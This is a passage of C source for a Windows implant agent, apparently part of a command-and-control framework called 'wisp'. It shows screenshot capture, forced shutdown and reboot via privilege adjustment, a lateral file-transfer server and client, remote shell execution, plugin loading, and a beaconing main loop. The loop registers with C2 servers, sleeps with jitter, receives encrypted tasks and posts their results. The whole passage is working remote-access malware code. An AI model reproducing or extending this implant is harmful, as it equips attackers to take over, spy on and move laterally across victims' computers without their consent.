		WJObjPut(res, "output", s);
	}
	ok = TRUE;

done:
	if (img && pGdipDisposeImage)
		pGdipDisposeImage(img);
	if (hMem) {
		if (oldObj)
			pSelectObject(hMem, oldObj);
		pDeleteDC(hMem);
	}
	if (hbm)
		pDeleteObject(hbm);
	if (hScreen && pReleaseDC)
		pReleaseDC(NULL, hScreen);
	if (gdipStarted)
		pGdiplusShutdown(token);
	if (f != INVALID_HANDLE_VALUE)
		ApiWin->CloseHandle(f);
	if (buf)
		MemFreeLocal((LPVOID*)&buf, sz);
	if (b64) {
		bl = StrLenA(b64);
		MemFreeLocal((LPVOID*)&b64, bl + 1);
	}
	if (uri) {
		bl = StrLenA(uri);
		MemFreeLocal((LPVOID*)&uri, bl + 1);
	}
	ApiWin->DeleteFileA(file);
	if (!ok)
		WJObjPutStr(res, "output", "screenshot failed");
	return ok;
}

//////// host power actions (CmdHost*=28..31) ////////

typedef BOOL(WINAPI* PFN_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL(WINAPI* PFN_LookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
typedef BOOL(WINAPI* PFN_AdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
typedef BOOL(WINAPI* PFN_ExitWindowsEx)(UINT, DWORD);
typedef BOOL(WINAPI* PFN_LockWorkStation)(void);

static BOOL wisp_enable_shutdown(void)
{
	HMODULE adv = ApiWin->LoadLibraryA("advapi32.dll");
	PFN_OpenProcessToken opt;
	PFN_LookupPrivilegeValueA lpv;
	PFN_AdjustTokenPrivileges atp;
	HANDLE tok = NULL;
	TOKEN_PRIVILEGES tp;
	BOOL ok = FALSE;
	if (!adv || !ApiWin->GetProcAddress)
		return FALSE;
	opt = (PFN_OpenProcessToken)ApiWin->GetProcAddress(adv, "OpenProcessToken");
	lpv = (PFN_LookupPrivilegeValueA)ApiWin->GetProcAddress(adv, "LookupPrivilegeValueA");
	atp = (PFN_AdjustTokenPrivileges)ApiWin->GetProcAddress(adv, "AdjustTokenPrivileges");
	if (!opt || !lpv || !atp)
		return FALSE;
	if (opt(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) {
		memset(&tp, 0, sizeof(tp));
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (lpv(NULL, "SeShutdownPrivilege", &tp.Privileges[0].Luid)) {
			ok = atp(tok, FALSE, &tp, 0, NULL, NULL);
		}
		ApiWin->CloseHandle(tok);
	}
	return ok;
}

static BOOL wisp_host_action(ULONG cmd, WJVal* res)
{
	HMODULE u32 = ApiWin->LoadLibraryA("user32.dll");
	PFN_ExitWindowsEx ewx = u32 && ApiWin->GetProcAddress ? (PFN_ExitWindowsEx)ApiWin->GetProcAddress(u32, "ExitWindowsEx") : NULL;
	PFN_LockWorkStation lws = u32 && ApiWin->GetProcAddress ? (PFN_LockWorkStation)ApiWin->GetProcAddress(u32, "LockWorkStation") : NULL;
	BOOL ok = FALSE;

	if (cmd == WISP_CMD_HOST_LOCK) {
		ok = lws && lws();
		WJObjPutStr(res, "output", ok ? "locked" : "lock failed");
		return ok;
	}
	if (!ewx) {
		WJObjPutStr(res, "output", "host action unavailable");
		return FALSE;
	}
	wisp_enable_shutdown();
	if (cmd == WISP_CMD_HOST_REBOOT)
		ok = ewx(EWX_REBOOT | EWX_FORCEIFHUNG, 0);
	else if (cmd == WISP_CMD_HOST_SHUTDOWN)
		ok = ewx(EWX_POWEROFF | EWX_FORCEIFHUNG, 0);
	else if (cmd == WISP_CMD_HOST_LOGOFF)
		ok = ewx(EWX_LOGOFF | EWX_FORCEIFHUNG, 0);
	WJObjPutStr(res, "output", ok ? "requested" : "host action failed");
	return ok;
}

//////// lateral Xfer (CmdXferServe=67 / CmdXferFetch=68) ////////

typedef int(WINAPI* PFN_getsocknameA)(SOCKET, struct sockaddr*, int*);

static PFN_getsocknameA wisp_getsockname(void)
{
	static PFN_getsocknameA p = NULL;
	if (!p && SysModules && SysModules->Ws2_32 && ApiWin->GetProcAddress)
		p = (PFN_getsocknameA)ApiWin->GetProcAddress(SysModules->Ws2_32, "getsockname");
	return p;
}

static BOOL xs_all(SOCKET s, const BYTE* d, ULONG n)
{
	ULONG off = 0;
	while (off < n) {
		int r = ApiWin->send(s, (const char*)d + off, (int)(n - off), 0);
		if (r <= 0)
			return FALSE;
		off += (ULONG)r;
	}
	return TRUE;
}

static BOOL xr_all(SOCKET s, BYTE* d, ULONG n)
{
	ULONG off = 0;
	while (off < n) {
		int r = ApiWin->recv(s, (char*)d + off, (int)(n - off), 0);
		if (r <= 0)
			return FALSE;
		off += (ULONG)r;
	}
	return TRUE;
}

static void be32w(BYTE* p, ULONG v)
{
	p[0] = (BYTE)(v >> 24); p[1] = (BYTE)(v >> 16); p[2] = (BYTE)(v >> 8); p[3] = (BYTE)v;
}

static ULONG be32r(const BYTE* p)
{
	return ((ULONG)p[0] << 24) | ((ULONG)p[1] << 16) | ((ULONG)p[2] << 8) | p[3];
}

static BOOL xfer_parse_addr(const char* addr, char* host, ULONG cap, USHORT* port)
{
	const char* p = addr;
	const char* colon = NULL;
	const char* q;
	ULONG n, i;
	USHORT pv = 0;
	if (!addr || !addr[0])
		return FALSE;
	if (p[0] == '[') {
		const char* rb = NULL;
		for (q = p + 1; *q; q++)
			if (*q == ']') { rb = q; break; }
		if (!rb)
			return FALSE;
		n = (ULONG)(rb - (p + 1));
		if (n >= cap)
			return FALSE;
		for (i = 0; i < n; i++) host[i] = p[1 + i];
		host[n] = 0;
		if (StrCmpA(host, "::") == 0 || StrCmpA(host, "::1") == 0)
			wisp_copy_str(host, cap, "127.0.0.1");
		colon = rb + 1;
		if (*colon != ':')
			return FALSE;
	}
	else {
		for (q = p; *q; q++)
			if (*q == ':') colon = q;
		if (!colon) {
			n = StrLenA(p);
			if (n >= cap) return FALSE;
			for (i = 0; i < n; i++) host[i] = p[i];
			host[n] = 0;
			*port = 0;
			return TRUE;
		}
		n = (ULONG)(colon - p);
		if (n >= cap)
			return FALSE;
		for (i = 0; i < n; i++) host[i] = p[i];
		host[n] = 0;
	}
	for (q = colon + 1; *q >= '0' && *q <= '9'; q++)
		pv = (USHORT)(pv * 10 + (*q - '0'));
	*port = pv;
	return TRUE;
}

static BOOL xfer_resolve(const char* host, struct sockaddr_in* sa)
{
	ULONG ip;
	memset(sa, 0, sizeof(*sa));
	sa->sin_family = AF_INET;
	if (!host || !host[0] || StrCmpA((CHAR*)host, (CHAR*)"0.0.0.0") == 0) {
		sa->sin_addr.s_addr = 0;
		return TRUE;
	}
	ip = _inet_addr(host);
	if (ip == 0xFFFFFFFF) {
		struct hostent* he = ApiWin->gethostbyname(host);
		if (!he || !he->h_addr_list || !he->h_addr_list[0])
			return FALSE;
		memcpy(&sa->sin_addr, he->h_addr_list[0], 4);
	}
	else {
		sa->sin_addr.s_addr = ((ip & 0xFF) << 24) | ((ip & 0xFF00) << 8) | ((ip >> 8) & 0xFF00) | ((ip >> 24) & 0xFF);
	}
	return TRUE;
}

static void xfer_hex_hmac(const char* psk, const char* nonce, char* outHex)
{
	BYTE mac[32];
	char msg[256];
	ULONG n = 0, i;
	const char* pre = "xfer|";
	for (i = 0; pre[i] && n + 1 < sizeof(msg); i++) msg[n++] = pre[i];
	for (i = 0; nonce[i] && n + 1 < sizeof(msg); i++) msg[n++] = nonce[i];
	msg[n] = 0;
	if (WispHmacSha256((const BYTE*)psk, StrLenA(psk), (const BYTE*)msg, n, mac))
		wisp_hex(mac, 32, outHex);
	else
		outHex[0] = 0;
}

typedef struct {
	SOCKET ln;
	char   path[512];
	char   nonce[128];
	char   psk[256];
} XFER_SERVE_CTX;

static DWORD WINAPI xfer_serve_thread(LPVOID param)
{
	XFER_SERVE_CTX* x = (XFER_SERVE_CTX*)param;
	fd_set rfds;
	struct timeval tv;
	int sr;
	SOCKET c = INVALID_SOCKET;
	BYTE hdr[4];
	ULONG pl;
	char proof[512];
	char expect[65];
	HANDLE f = INVALID_HANDLE_VALUE;
	BYTE* buf = NULL;

	FD_ZERO(&rfds);
	FD_SET(x->ln, &rfds);
	tv.tv_sec = 300;
	tv.tv_usec = 0;
	sr = ApiWin->select(0, &rfds, NULL, NULL, &tv);
	if (sr <= 0)
		goto done;
	c = ApiWin->accept(x->ln, NULL, NULL);
	if (c == INVALID_SOCKET)
		goto done;
	{ DWORD tv2 = 300000; ApiWin->setsockopt(c, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv2, sizeof(tv2)); }
	if (!xr_all(c, hdr, 4))
		goto done;
	pl = be32r(hdr);
	if (pl == 0 || pl > sizeof(proof) - 1)
		goto done;
	if (!xr_all(c, (BYTE*)proof, pl))
		goto done;
	proof[pl] = 0;
	xfer_hex_hmac(x->psk, x->nonce, expect);
	if (!expect[0] || StrCmpA((CHAR*)proof, expect) != 0)
		goto done;

	f = ApiWin->CreateFileA(x->path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
		goto done;
	buf = (BYTE*)MemAllocLocal(256 * 1024);
	if (!buf)
		goto done;
	for (;;) {
		DWORD got = 0;
		if (!ApiWin->ReadFile(f, buf, 256 * 1024, &got, NULL) || got == 0)
			break;
		be32w(hdr, got);
		if (!xs_all(c, hdr, 4) || !xs_all(c, buf, got))
			goto done;
	}
	be32w(hdr, 0);
	xs_all(c, hdr, 4);

done:
	if (buf) MemFreeLocal((LPVOID*)&buf, 256 * 1024);
	if (f != INVALID_HANDLE_VALUE) ApiWin->CloseHandle(f);
	if (c != INVALID_SOCKET) ApiWin->closesocket(c);
	if (x->ln != INVALID_SOCKET) ApiWin->closesocket(x->ln);
	MemFreeLocal((LPVOID*)&x, sizeof(XFER_SERVE_CTX));
	return 0;
}

static BOOL xfer_serve(WispConfig* cfg, WJVal* args, WJVal* res)
{
	WJVal* av = WJObjGet(args, "addr");
	WJVal* pv = WJObjGet(args, "path");
	WJVal* nv = WJObjGet(args, "nonce");
	const char* addr = av && av->type == WJ_STR ? av->str : ":0";
	const char* path = pv && pv->type == WJ_STR ? pv->str : NULL;
	const char* nonce = nv && nv->type == WJ_STR ? nv->str : "";
	char host[256];
	USHORT port = 0;
	struct sockaddr_in sa;
	SOCKET ln;
	USHORT bound = 0;
	XFER_SERVE_CTX* x;
	HANDLE th;
	char outAddr[300];
	char ipbuf[64];

	if (!path || !path[0] || !nonce[0]) {
		WJObjPutStr(res, "output", "bad xfer args");
		return FALSE;
	}
	if (!xfer_parse_addr(addr, host, sizeof(host), &port))
		port = 0;
	if (!xfer_resolve(host, &sa))
		return FALSE;
	sa.sin_port = _htons(port);
	ln = ApiWin->socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ln == INVALID_SOCKET)
		return FALSE;
	{
		int yes = 1;
		ApiWin->setsockopt(ln, SOL_SOCKET, SO_REUSEADDR, (const char*)&yes, sizeof(yes));
	}
	if (ApiWin->bind(ln, (struct sockaddr*)&sa, sizeof(sa)) != 0 ||
		ApiWin->listen(ln, 1) != 0) {
		ApiWin->closesocket(ln);
		return FALSE;
	}
	{
		struct sockaddr_in got;
		int gl = sizeof(got);
		PFN_getsocknameA gsn = wisp_getsockname();
		if (gsn && gsn(ln, (struct sockaddr*)&got, &gl) == 0)
			bound = _htons(got.sin_port);
	}
	if (bound == 0) {
		/* fall back to the requested port (only valid when non-zero) */
		bound = port;
	}
		{
		ULONG ip = GetInternalIpLong();
		BYTE* b = (BYTE*)&ip;
		if (ip == 0 || !ApiWin->snprintf)
			wisp_copy_str(ipbuf, sizeof(ipbuf), "127.0.0.1");
		else
			ApiWin->snprintf(ipbuf, sizeof(ipbuf), "%u.%u.%u.%u", b[0], b[1], b[2], b[3]);
	}
	if (ApiWin->snprintf)
		ApiWin->snprintf(outAddr, sizeof(outAddr), "%s:%u", ipbuf, (unsigned)bound);
	else {
		wisp_copy_str(outAddr, sizeof(outAddr), ipbuf);
	}
	x = (XFER_SERVE_CTX*)MemAllocLocal(sizeof(XFER_SERVE_CTX));
	if (!x) {
		ApiWin->closesocket(ln);
		return FALSE;
	}
	memset(x, 0, sizeof(*x));
	x->ln = ln;
	wisp_copy_str(x->path, sizeof(x->path), path);
	wisp_copy_str(x->nonce, sizeof(x->nonce), nonce);
	wisp_copy_str(x->psk, sizeof(x->psk), cfg->psk);
	th = ApiWin->CreateThread(NULL, 0, xfer_serve_thread, x, 0, NULL);
	if (th)
		ApiWin->CloseHandle(th);
	else {
		ApiWin->closesocket(ln);
		MemFreeLocal((LPVOID*)&x, sizeof(XFER_SERVE_CTX));
		return FALSE;
	}
	{
		WJVal* o = WJNewObj();
		if (!o)
			return FALSE;
		WJObjPutStr(o, "addr", outAddr);
		{
			char* js = WJSerialize(o);
			WJVal* s = js ? WJNewStr(js) : NULL;
			if (js) { ULONG jl = StrLenA(js); MemFreeLocal((LPVOID*)&js, jl + 1); }
			if (s) WJObjPut(res, "output", s);
		}
		WJFree(o);
	}
	return TRUE;
}

static BOOL xfer_fetch(WispConfig* cfg, WJVal* args, WJVal* res)
{
	WJVal* av = WJObjGet(args, "addr");
	WJVal* nv = WJObjGet(args, "nonce");
	WJVal* lv = WJObjGet(args, "local");
	const char* addr = av && av->type == WJ_STR ? av->str : NULL;
	const char* nonce = nv && nv->type == WJ_STR ? nv->str : "";
	const char* local = lv && lv->type == WJ_STR ? lv->str : NULL;
	char host[256];
	USHORT port = 0;
	struct sockaddr_in sa;
	SOCKET c;
	char proof[65];
	char part[520];
	ULONG i, j;
	HANDLE f = INVALID_HANDLE_VALUE;
	BYTE* buf = NULL;
	BYTE hdr[4];
	ULONG n = 0;
	WispSha256Ctx ctx;
	BYTE sum[32];
	char hex[65];
	BOOL ok = FALSE;
	char reason[128];

	if (!addr || !local || !local[0] || !nonce[0]) {
		WJObjPutStr(res, "output", "bad xfer args");
		return FALSE;
	}
	if (!xfer_parse_addr(addr, host, sizeof(host), &port) || port == 0) {
		WJObjPutStr(res, "output", "bad xfer addr");
		return FALSE;
	}
	if (!xfer_resolve(host, &sa)) {
		WJObjPutStr(res, "output", "resolve failed");
		return FALSE;
	}
	sa.sin_port = _htons(port);
	c = ApiWin->socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (c == INVALID_SOCKET) {
		WJObjPutStr(res, "output", "socket failed");
		return FALSE;
	}
	if (ApiWin->connect(c, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
		ApiWin->closesocket(c);
		WJObjPutStr(res, "output", "connect failed");
		return FALSE;
	}
	xfer_hex_hmac(cfg->psk, nonce, proof);
	if (!proof[0]) {
		ApiWin->closesocket(c);
		WJObjPutStr(res, "output", "proof failed");
		return FALSE;
	}
	{
		ULONG pl = StrLenA(proof);
		be32w(hdr, pl);
		if (!xs_all(c, hdr, 4) || !xs_all(c, (const BYTE*)proof, pl)) {
			ApiWin->closesocket(c);
			WJObjPutStr(res, "output", "send proof failed");
			return FALSE;
		}
	}
	for (i = 0; local[i] && i + 1 < sizeof(part); i++) part[i] = local[i];
	for (j = 0; ".part"[j] && i + 1 < sizeof(part); j++) part[i++] = ".part"[j];
	part[i] = 0;
	f = ApiWin->CreateFileA(part, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE) {
		ApiWin->closesocket(c);
		WJObjPutStr(res, "output", "open part failed");
		return FALSE;
	}
	buf = (BYTE*)MemAllocLocal(256 * 1024);
	if (!buf || !WispSha256Begin(&ctx)) {
		reason[0] = 0;
		goto fail;
	}
	for (;;) {
		ULONG cl;
		DWORD wr = 0;
		if (!xr_all(c, hdr, 4)) goto fail;
		cl = be32r(hdr);
		if (cl == 0)
			break;
		if (cl > 256 * 1024) goto fail;
		if (!xr_all(c, buf, cl)) goto fail;
		if (!ApiWin->WriteFile(f, buf, cl, &wr, NULL) || wr != cl) goto fail;
		if (!WispSha256Update(&ctx, buf, cl)) goto fail;
		n += cl;
	}
	ApiWin->CloseHandle(f);
	f = INVALID_HANDLE_VALUE;
	if (!WispSha256End(&ctx, sum)) goto fail;
	wisp_hex(sum, 32, hex);
	ApiWin->DeleteFileA(local);
	if (!ApiWin->MoveFileA(part, local)) {
		wisp_copy_str(reason, sizeof(reason), "rename failed");
		goto fail;
	}
	{
		WJVal* o = WJNewObj();
		char* js;
		if (o) {
			WJObjPutNum(o, "bytes", (double)n);
			WJObjPutStr(o, "sha256", hex);
			js = WJSerialize(o);
			if (js) {
				WJVal* s = WJNewStr(js);
				ULONG jl = StrLenA(js);
				MemFreeLocal((LPVOID*)&js, jl + 1);
				if (s) WJObjPut(res, "output", s);
			}
			WJFree(o);
		}
	}
	ok = TRUE;
	goto done;

fail:
	wisp_copy_str(reason, sizeof(reason), "xfer failed");
	if (f != INVALID_HANDLE_VALUE) { ApiWin->CloseHandle(f); f = INVALID_HANDLE_VALUE; }
	ApiWin->DeleteFileA(part);
done:
	if (buf) MemFreeLocal((LPVOID*)&buf, 256 * 1024);
	if (f != INVALID_HANDLE_VALUE) ApiWin->CloseHandle(f);
	ApiWin->closesocket(c);
	if (!ok)
		WJObjPutStr(res, "output", reason[0] ? reason : "xfer failed");
	return ok;
}

static void wisp_run_task(WispConfig* cfg, WJVal* task, WJVal* res, TaskOutcome* outcome)
{
	WLOG("[wisp] run_task enter\n");
	const char* id = wj_str(WJObjGet(task, "id"));
	WJObjPutStr(res, "task_id", id ? id : "");
	WJVal* cmdv = WJObjGet(task, "cmd");
	ULONG cmd = (ULONG)WJNumAsI64(cmdv, 0);
	WJVal* args = WJObjGet(task, "args");
	BOOL argsOwned = FALSE;
	if (!args) {
		args = WJNewNull();
		argsOwned = TRUE;
	}

	BOOL ok = TRUE;
	int exitCode = 0;
	char* outText = NULL;

	switch (cmd) {
	case WISP_CMD_SHELL: {
		const char* command = wj_str(WJObjGet(args, "command"));
		WJVal* tmo = WJObjGet(args, "timeout_ms");
		ULONG tms = (ULONG)WJNumAsI64(tmo, 15000);
		if (!command || !command[0]) {
			ok = FALSE;
			outText = (char*)MemAllocLocal(24);
			if (outText) memcpy(outText, "shell: empty command", 20);
		}
		else {
			char* out = NULL; ULONG outLen = 0; int code = 0;
			if (wisp_run_shell(command, tms ? tms : 15000, &out, &outLen, &code)) {
				outText = out;
				exitCode = code;
			}
			else {
				ok = FALSE;
				outText = (char*)MemAllocLocal(24);
				if (outText) memcpy(outText, "shell: exec failed", 19);
			}
		}
		break;
	}
	case WISP_CMD_SYSINFO:
		wisp_task_sysinfo(res);
		break;
	case WISP_CMD_PWD:
		wisp_task_pwd(res);
		break;
	case WISP_CMD_LS_JSON:
		wisp_task_ls(res, args);
		break;
	case WISP_CMD_MKDIR:
		wisp_task_mkdir(res, args);
		break;
	case WISP_CMD_RM:
		wisp_task_rm(res, args);
		break;
	case WISP_CMD_PS:
		wisp_task_ps(res);
		break;
	case WISP_CMD_SLEEP:
		wisp_task_sleep(cfg, res, args);
		break;
	case WISP_CMD_SCREENSHOT:
		ok = wisp_task_screenshot(res);
		break;
	case WISP_CMD_HOST_REBOOT:
	case WISP_CMD_HOST_SHUTDOWN:
	case WISP_CMD_HOST_LOGOFF:
	case WISP_CMD_HOST_LOCK:
		ok = wisp_host_action(cmd, res);
		break;
	case WISP_CMD_XFER_SERVE:
		ok = xfer_serve(cfg, args, res);
		break;
	case WISP_CMD_XFER_FETCH:
		ok = xfer_fetch(cfg, args, res);
		break;
	case WISP_CMD_PLUGIN_LOAD:
		ok = WispPluginLoad(cfg, args, res);
		break;
	case WISP_CMD_PLUGIN_EXEC:
		ok = WispPluginExec(args, res);
		break;
	case WISP_CMD_RCP_CONNECT: {
		WJVal* a = WJObjGet(args, "addr");
		WJVal* tk = WJObjGet(args, "token");
		const char* addr = (a && a->type == WJ_STR && a->str && a->str[0]) ? a->str : g_rcpAddr;
		const char* token = (tk && tk->type == WJ_STR) ? tk->str : g_rcpToken;
		if (!addr || !addr[0]) {
			ok = FALSE;
			WJObjPutStr(res, "output", "no Type2 address known");
		}
		else if (WispRcpStart(addr, token, g_agentIdHex)) {
			WJObjPutStr(res, "output", "dialing");
		}
		else {
			ok = FALSE;
			WJObjPutStr(res, "output", "rcp start failed");
		}
		break;
	}
	case WISP_CMD_RCP_DISCONNECT:
		WispRcpStop();
		WJObjPutStr(res, "output", "type2 down");
		break;
	case WISP_CMD_EXIT:
	case WISP_CMD_CLIENT_KILL:
		outcome->quit = TRUE;
		WJObjPutStr(res, "output", "exit");
		// the server marks us offline on this ack
		break;
	default:
		ok = FALSE;
		outText = (char*)MemAllocLocal(40);
		if (outText)
			ApiWin->snprintf(outText, 40, "cmd %u not implemented", cmd);
		break;
	}

	// handlers that already wrote "output" into res themselves
	BOOL handledInline =
		cmd == WISP_CMD_SYSINFO || cmd == WISP_CMD_PWD || cmd == WISP_CMD_LS_JSON ||
		cmd == WISP_CMD_MKDIR || cmd == WISP_CMD_RM || cmd == WISP_CMD_PS || cmd == WISP_CMD_SCREENSHOT ||
		cmd == WISP_CMD_HOST_REBOOT || cmd == WISP_CMD_HOST_SHUTDOWN || cmd == WISP_CMD_HOST_LOGOFF || cmd == WISP_CMD_HOST_LOCK ||
		cmd == WISP_CMD_XFER_SERVE || cmd == WISP_CMD_XFER_FETCH ||
		cmd == WISP_CMD_PLUGIN_LOAD || cmd == WISP_CMD_PLUGIN_EXEC ||
		cmd == WISP_CMD_SLEEP || cmd == WISP_CMD_RCP_CONNECT || cmd == WISP_CMD_RCP_DISCONNECT ||
		cmd == WISP_CMD_EXIT || cmd == WISP_CMD_CLIENT_KILL;

	if (!handledInline && outText) {
		WJVal* s = WJNewStr(outText);
		if (s)
			WJObjPut(res, "output", s);
		ULONG ol = StrLenA(outText);
		MemFreeLocal((LPVOID*)&outText, ol + 1);
	}

	{
		WJVal* okv = WJNewBool(ok);
		if (okv)
			WJObjPut(res, "ok", okv);
	}
	WJObjPutNum(res, "exit", exitCode);
	if (argsOwned)
		WJFree(args);
	WLOG("[wisp] run_task done\n");
}

// post a TaskResult envelope; returns TRUE when the server acked
static BOOL wisp_post_result(const WispConfig* cfg, const char* agentId, const WispSessionKey* sk, WJVal* res)
{
	WLOG("[wisp] post_result enter\n");
	WJVal* env = wisp_env_sealed(WISP_MSG_RESULT, agentId, sk, res);
	if (!env) {
		WLOG("[wisp] post_result: seal failed\n");
		return FALSE;
	}
	WLOG("[wisp] post_result: sealed ok\n");
	WJVal* resp = wisp_exchange(cfg, env);
	WJFree(env);
	if (!resp) {
		WLOG("[wisp] result post: no reply\n");
		return FALSE;
	}
	WJFree(resp);
	WLOG("[wisp] post_result: done\n");
	return TRUE;
}

//////// main loop ////////

DWORD WINAPI WispAgentMain(LPVOID param)
{
	(void)param;
	if (!ApiLoad())
		return 0;
	WLOG("[wisp] api loaded\n");
	if (!WispBcryptLoad()) {
		WLOG("[wisp] bcrypt load failed\n");
		return 0;
	}
	WLOG("[wisp] bcrypt ok\n");

	WispConfig cfg;
	if (!WispConfigLoad(&cfg)) {
		WLOG("[wisp] config load failed\n");
		return 0;
	}
	WLOG("[wisp] config: servers=%u psk_len=%u sleep=%u jitter=%u\n", cfg.serversCount, StrLenA(cfg.psk), cfg.sleepMS, cfg.jitterPct);

	char agentId[17];
	WispSessionKey sk;
	if (!wisp_register(&cfg, agentId, &sk)) {
		WLOG("[wisp] register failed\n");
		WispConfigFree(&cfg);
		return 0;
	}
	WLOG("[wisp] registered as %s\n", agentId);

	TaskOutcome outcome = { FALSE, cfg.sleepMS, cfg.jitterPct };
	ULONG64 seq = 0;
	ULONG startTick = ApiWin->GetTickCount();
	int fails = 0;

	for (;;) {
		seq++;
		// checkin {seq, uptime_ms}
		WJVal* hb = WJNewObj();
		WJObjPutNum(hb, "seq", (double)seq);
		WJObjPutNum(hb, "uptime_ms", (double)(ApiWin->GetTickCount() - startTick));
		WJVal* env = wisp_env_sealed(WISP_MSG_CHECKIN, agentId, &sk, hb);
		WJVal* resp = env ? wisp_exchange(&cfg, env) : NULL;
		WJFree(env);

		if (!resp) {
			fails++;
			if (fails >= 3) {
				// session lost: re-register
				if (!wisp_register(&cfg, agentId, &sk)) {
					ApiWin->Sleep(30000);
				}
				else {
					fails = 0;
					seq = 0;
				}
			}
		}
		else {
			fails = 0;
			// "d" is either null or a sealed Task
			WJVal* d = WJObjGet(resp, "d");
			BOOL isNull = !d || d->type == WJ_NULL;
			WJVal* task = NULL;
			if (!isNull && d->type == WJ_STR) {
				// sealed task: d is a base64 string of the sealed task JSON
				task = wisp_env_open(resp, &sk);
			}
			if (task && task->type == WJ_OBJ) {
			WLOG("[wisp] got task cmd=%lld\n", WJNumAsI64(WJObjGet(task, "cmd"), -1));
			WHV("task-received");
			outcome.quit = FALSE;
			WJVal* res = WJNewObj();
			wisp_run_task(&cfg, task, res, &outcome);
			WJFree(task);
			WHV("task-freed");
			WLOG("[wisp] task freed, posting result\n");
			// exit: ack synchronously then stop
			BOOL acked = wisp_post_result(&cfg, agentId, &sk, res);
				(void)acked;
				if (outcome.quit) {
					WJFree(resp);
					break;
				}
			}
			else if (task) {
				WJFree(task);
			}
		}
		if (resp) WJFree(resp);

		ULONG slp = WispEffectiveSleep(cfg.sleepMS, cfg.jitterPct);
		ApiWin->Sleep(slp);
	}

	WispRcpStop();
	WispPluginShutdown();
	WispConfigFree(&cfg);
	return 0;
}
